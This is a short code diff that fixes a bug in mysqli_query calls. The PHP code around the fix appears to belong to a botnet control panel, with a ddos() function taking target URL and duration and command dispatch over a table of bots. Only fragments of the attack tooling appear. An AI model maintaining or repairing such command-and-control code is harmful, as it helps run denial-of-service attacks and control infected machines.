@@ -726,7 +726,7 @@ function ddos() {
     if(isset($_POST['url']) && isset($_POST['time']) && isset($_POST['sup'])) {
 
 		$conn = new mysqli(SQL_HOST, SQL_USER, SQL_PWD, SQL_DB);
-		$rows = mysqli_query($conn,'SELECT * FROM `bots`', $conn);
+		$rows = mysqli_query($conn,'SELECT * FROM `bots`');
 
 		if($_POST['sup'] == 'kill') {
 			$x = 0;
@@ -928,7 +928,7 @@ if(isset($_POST['cmd']) && isset($_POST['func'])) {
 
 $conn = new mysqli(SQL_HOST, SQL_USER, SQL_PWD, SQL_DB);
 
-$rows = mysqli_query($conn,'SELECT * FROM `bots`', $conn);    
+$rows = mysqli_query($conn,'SELECT * FROM `bots`');    
 
 while($row = mysqli_fetch_assoc($rows)) {
 
